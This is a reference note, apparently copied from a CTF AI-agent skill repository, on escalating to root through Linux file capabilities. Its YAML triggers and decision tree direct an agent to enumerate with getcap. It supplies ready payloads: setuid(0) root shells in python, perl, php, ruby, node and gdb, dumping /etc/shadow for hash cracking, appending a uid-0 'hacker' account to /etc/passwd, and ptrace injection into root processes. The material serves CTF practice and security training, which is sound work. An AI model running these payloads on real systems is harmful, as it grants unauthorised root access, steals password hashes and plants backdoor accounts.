# Linux Capabilities Privilege Escalation

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/host-linux/capabilities.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/host-linux/capabilities.md)

---

---
name: capabilities
category: host-linux
triggers: ["getcap", "cap_setuid", "cap_dac_read_search", "cap_dac_override", "capabilities", "cap_chown", "cap_sys_admin", "cap_setgid", "ep permitted effective"]
tools: ["getcap", "setcap", "python", "perl", "tar", "gdb"]
priority: high
description: Enumerate Linux file capabilities and exploit cap_setuid, cap_dac_read_search, cap_dac_override and friends for privilege escalation.
---
# Linux Capabilities Privilege Escalation

## Trigger context
`getcap -r /` reveals a binary carrying a Linux capability such as `cap_setuid`, `cap_dac_read_search`, `cap_dac_override`, `cap_chown`, or `cap_sys_admin`, usually with the `+ep` (effective, permitted) flags. Capabilities grant a slice of root power without the SUID bit, and are easy to miss.

## Objective
Use a capability-bearing binary to become root directly (`cap_setuid`), read/overwrite root-only files (`cap_dac_read_search` / `cap_dac_override`), or otherwise convert the granted privilege into full root.

## Methodology (decision tree)
1. Enumerate capabilities filesystem-wide with `getcap -r /`.
2. Read the flags: `+ep` = capability is active for anyone running the binary; `+ei` needs the caller to already hold it (usually not exploitable). Focus on `+ep`.
3. Map capability -> technique:
   - `cap_setuid` -> the binary can call `setuid(0)`; if it's an interpreter (python/perl/ruby/php/node) or has a GTFOBins Capabilities entry, get a root shell.
   - `cap_dac_read_search` -> bypass read permission: exfil `/etc/shadow`, SSH keys, root files (then crack/reuse).
   - `cap_dac_override` -> bypass write permission: overwrite `/etc/passwd` or `/etc/shadow` to add a root user.
   - `cap_chown` / `cap_fowner` -> chown a file to yourself, then edit (e.g. `/etc/passwd`).
   - `cap_sys_admin`, `cap_sys_ptrace`, `cap_sys_module` -> powerful; mount abuse, ptrace-inject into a root process, or load a kernel module.
4. Execute the matching payload and verify uid.

## Commands & payloads
```bash
# --- Enumerate ---
getcap -r / 2>/dev/null                    # all capabilities
/usr/sbin/getpcaps $$ 2>/dev/null           # caps of current process
grep -r cap /etc/security/capability.conf 2>/dev/null

# --- cap_setuid on an interpreter: instant root ---
# e.g. getcap shows: /usr/bin/python3.8 = cap_setuid+ep
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'    # perl w/ cap_setuid
php -r 'posix_setuid(0); system("/bin/bash");'                  # php
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'              # ruby
node -e 'process.setuid(0); require("child_process").execSync("/bin/bash",{stdio:"inherit"})'

# --- cap_setuid on gdb ---
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/bash' -ex quit

# --- cap_dac_read_search: read any file (e.g. /etc/shadow) ---
# tar has a Capabilities entry: it can read root-only files
./tar xf /etc/shadow -O 2>/dev/null || ./tar cf shadow.tar /etc/shadow  # then extract & read
# python with cap_dac_read_search:
python3 -c 'print(open("/etc/shadow").read())'                 # if binary carries the cap
# Then unshadow + crack:  unshadow passwd.copy shadow.copy > h ; john/hashcat

# --- cap_dac_override: overwrite a protected file -> add root user ---
# openssl passwd -1 -salt xx pass  => hash; append to /etc/passwd
python3 -c 'open("/etc/passwd","a").write("hacker:$1$xx$H...:0:0:root:/root:/bin/bash\n")'
su hacker           # password: pass  -> root

# --- cap_chown / cap_fowner: take ownership then edit ---
./chown_binary $(whoami) /etc/passwd   # then edit /etc/passwd to add uid 0 user

# --- cap_sys_ptrace (+ a root process): inject shellcode into a root PID ---
# use gdb/injectso to attach to a root-owned process and run execve("/bin/sh").
```

## Branching logic
- Interpreter/tool with `cap_setuid+ep` -> shortest path; `setuid(0)` then shell.
- `cap_setuid` on a custom binary with no shell-out -> check GTFOBins Capabilities entry; if none, it may still `setuid` then exec something you influence (PATH/args).
- `cap_dac_read_search` only (read, not write) -> harvest `/etc/shadow` + SSH keys; crack or reuse rather than direct shell.
- `cap_dac_override` (write) -> overwrite `/etc/passwd` (add root user) or a root cron/script.
- `+ei` / `+i` flags -> generally NOT exploitable by an unprivileged caller; note and move on.
- `cap_sys_admin`/`cap_sys_module` -> heavier: mount namespaces, or `insmod` a malicious module. Try the lighter caps first.
- Capability present but binary refuses to drop privs into a shell -> combine with LD_PRELOAD/PATH if it shells out.

## Common pitfalls
- Confusing `+ep` (exploitable) with `+ei`/`+p` (needs pre-held cap) — read the flags.
- `cap_setuid` alone does not change euid automatically; you must actually CALL `setuid(0)` in the payload. Just running the binary does nothing.
- Forgetting that `cap_dac_read_search` gives READ only — you can't overwrite `/etc/passwd` with it; use `cap_dac_override`/`cap_chown` for writes.
- Wrong interpreter version path: use the exact binary getcap reported (e.g. `python3.8`, not `python`).
- Ambient/inherited caps (`getpcaps`) are different from file caps; don't confuse process caps with file caps.
- On some systems `getcap` isn't installed — fall back to `find / -type f -exec getcap {} \;` after locating a getcap, or read the extended attribute.

## Proof / verification
- `id` shows `uid=0(root)` after `setuid(0)`.
- For read caps: you successfully print `/etc/shadow` (root-only, mode 640/000).
- For write caps: `su` into the injected root account, or the modified file shows your change and a login works.

## Cross-references
- [sa--instructions--host-linux--suid-sgid.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--suid-sgid.md) — capabilities are the SUID-less cousin; same GTFOBins tools.
- [sa--instructions--host-linux--sudo-gtfobins.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--sudo-gtfobins.md) — GTFOBins lookups and LD_PRELOAD chaining.
- [sa--instructions--host-linux--kernel-and-misc-privesc.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--kernel-and-misc-privesc.md) — writable /etc/passwd technique detail, container caps.

## Credible sources
- HackTricks Linux capabilities: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html
- GTFOBins (Capabilities function): https://gtfobins.github.io/
- man capabilities(7): https://man7.org/linux/man-pages/man7/capabilities.7.html
- PayloadsAllTheThings capabilities: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
